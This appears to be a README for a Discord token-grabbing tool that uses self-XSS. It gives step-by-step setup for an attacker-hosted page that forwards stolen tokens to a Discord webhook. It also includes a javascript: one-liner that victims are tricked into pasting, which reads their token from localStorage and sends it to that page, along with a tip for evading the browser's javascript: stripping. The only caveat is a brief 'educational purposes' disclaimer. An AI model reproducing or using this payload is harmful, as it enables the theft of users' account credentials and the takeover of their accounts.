# Discord token grabbing link or self xss 
Instructions:

1. Replace YOUR_WEBHOOK_URL with your actual Discord webhook URL in index.html.


2. Host this index.html file anywhere (e.g., GitHub Pages, Vercel, etc.).


3. When the user is redirected to https://yoursite.com?site=token, the script will automatically send the token to the webhook. replace your site .Com with that index.html site


# self xss code 
Here’s a one-liner that grabs the token from localStorage and redirects the user to a URL with the token as a query parameter:

'javascript:(() => {let i=document.createElement('iframe');document.body.append(i);let t=JSON.parse(i.contentWindow.localStorage.token);window.location.href=`https://your-site.com?site=${t}`})();

# Notes:
* IMPORTANT: After pasting it, remove the ' from the front. This bypasses the browser removing javascript:
Replace https://your-site.com with any URL with the index.html site

The token is automatically appended as a site query parameter.

# How It Works:

The JS payload grabs the token from localStorage and redirects the user to a site like:
https://yourdomain.com/index.html?site=token

The HTML page on that domain extracts token from the URL and sends it to your Discord webhook.

# warnings
This script is made for educational purposes only. I am not responsible for any misuse or malicious activities.

